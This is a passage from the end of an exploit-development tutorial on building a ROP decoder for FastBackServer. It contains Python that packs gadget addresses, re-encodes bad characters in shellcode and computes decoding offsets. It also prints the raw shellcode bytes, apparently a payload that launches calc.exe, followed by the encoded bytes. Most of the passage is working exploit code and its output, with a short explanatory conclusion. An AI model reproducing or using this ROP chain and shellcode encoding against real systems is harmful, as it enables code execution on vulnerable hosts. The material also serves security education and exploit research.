    ROPDecoder += pack("<L", 0x5051579a)  # add eax, ecx ; ret  ; Make eax point to the badchar to decode
    ROPDecoder += pack("<L", 0x505263f9)  # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
    ROPDecoder += pack("<L", 0x41414141)  # dummy value for pop ebx
    ROPDecoder += pack("<L", 0x5053a0f5)  # pop eax ; ret  ;
    ROPDecoder += pack("<L", decode_value)  # decoding value
    ROPDecoder += pack("<L", 0x5050626e)  # add byte [esi+0x3B], ah ;
    return ROPDecoder

def subtract_consecutive_elements(my_list):
    subtraction_results = []
    for i in range(len(my_list) - 1):
        result = my_list[i + 1] - my_list[i]
        subtraction_results.append(result)
        print(f"Offset result from {my_list[i]} to {my_list[i + 1]}: {result}")

    return subtraction_results

with open("shellcode.txt", "r") as file:
    my_shellcode = file.read()
    print("[+] Shellcode:", my_shellcode)
rop = ROPDecoder = pack("<L", 0x5050118e)
badchars= ["00", "09", "0a", "0b", "0c", "0d", "20"]
encoded_shellcode, bad_index = encode_shellcode(my_shellcode, badchars, 0xfb)
offsets_to_decode = subtract_consecutive_elements(list(reversed(bad_index)))
for i in offsets_to_decode:
    rop += create_gadget(0x05050505, i)
```
- Output:

```
[+] Shellcode: \xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00
[!] Bad char \x00 at index 4 Encoded to 0xfb
[!] Bad char \x00 at index 5 Encoded to 0xfb
[!] Bad char \x00 at index 6 Encoded to 0xfb
[!] Bad char \x0c at index 18 Encoded to 0x07
[!] Bad char \x20 at index 37 Encoded to 0x1b
[!] Bad char \x0d at index 40 Encoded to 0x08
[!] Bad char \x20 at index 64 Encoded to 0x1b
[!] Bad char \x0d at index 83 Encoded to 0x08
[!] Bad char \x0c at index 106 Encoded to 0x07
[!] Bad char \x00 at index 143 Encoded to 0xfb
[!] Bad char \x00 at index 144 Encoded to 0xfb
[!] Bad char \x00 at index 145 Encoded to 0xfb
[!] Bad char \x0a at index 169 Encoded to 0x05
[!] Bad char \x00 at index 181 Encoded to 0xfb
[!] Bad char \x00 at index 193 Encoded to 0xfb
[+] Encoded Shellcode: shellcode = b"\xfc\xe8\x82\xfb\xfb\xfb\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x07\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x1b\xc1\xcf\x08\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x1b\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x08\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x07\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\xfb\xfb\xfb\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x05\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\xfb\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\xfb"
Offset result from 181 to 169: -12
Offset result from 169 to 145: -24
Offset result from 145 to 144: -1
Offset result from 144 to 143: -1
Offset result from 143 to 106: -37
Offset result from 106 to 83: -23
Offset result from 83 to 64: -19
Offset result from 64 to 40: -24
Offset result from 40 to 37: -3
Offset result from 37 to 18: -19
Offset result from 18 to 6: -12
Offset result from 6 to 5: -1
Offset result from 5 to 4: -1
Result of subtraction: -12
Hexadecimal representation: -0xc
Negative hexadecimal representation: 0xfffffff4
Result of subtraction: -24
Hexadecimal representation: -0x18
Negative hexadecimal representation: 0xffffffe8
Result of subtraction: -1
Hexadecimal representation: -0x1
Negative hexadecimal representation: 0xffffffff
Result of subtraction: -1
Hexadecimal representation: -0x1
Negative hexadecimal representation: 0xffffffff
Result of subtraction: -37
Hexadecimal representation: -0x25
Negative hexadecimal representation: 0xffffffdb
Result of subtraction: -23
Hexadecimal representation: -0x17
Negative hexadecimal representation: 0xffffffe9
Result of subtraction: -19
Hexadecimal representation: -0x13
Negative hexadecimal representation: 0xffffffed
Result of subtraction: -24
Hexadecimal representation: -0x18
Negative hexadecimal representation: 0xffffffe8
Result of subtraction: -3
Hexadecimal representation: -0x3
Negative hexadecimal representation: 0xfffffffd
Result of subtraction: -19
Hexadecimal representation: -0x13
Negative hexadecimal representation: 0xffffffed
Result of subtraction: -12
Hexadecimal representation: -0xc
Negative hexadecimal representation: 0xfffffff4
Result of subtraction: -1
Hexadecimal representation: -0x1
Negative hexadecimal representation: 0xffffffff
Result of subtraction: -1
Hexadecimal representation: -0x1
Negative hexadecimal representation: 0xffffffff
```

Here when we encode the shellcode, We will also save the indexes in array named `bad_index`, Then wwe will return this array, After that we will pass it to `subtract_consecutive_elements` which will calculate the differances from index to another and return the values in an array, Following by that we will take the reults and go through it element by element, Then take the element to `create_gadget` function, Which will fill the `ROPDecoder` gadgets with the needed value by converting the offsets of the indexes to the badchars into `32-bit` format. Finally, it will return for us each decoding gadget and add it to our `ROPGadget`. 

# Conclusion

Now, You can create your own `ROPDecoder` easily as you understood it in depth, Maybe next time we talk about how to use different gadgets such as: `ror`, `or` & etc...., Finally, You can use other gadgets with-in `FastBackServer`, But i used a complex one, Just to cover most of the possiable situations we could face while doing creating our `ROPDecoder`. In some cases if the register that has the decoding value, Is not need to be manupilated Therefor, We can cancel poping the decode value into it each time we decode as it's the same value.
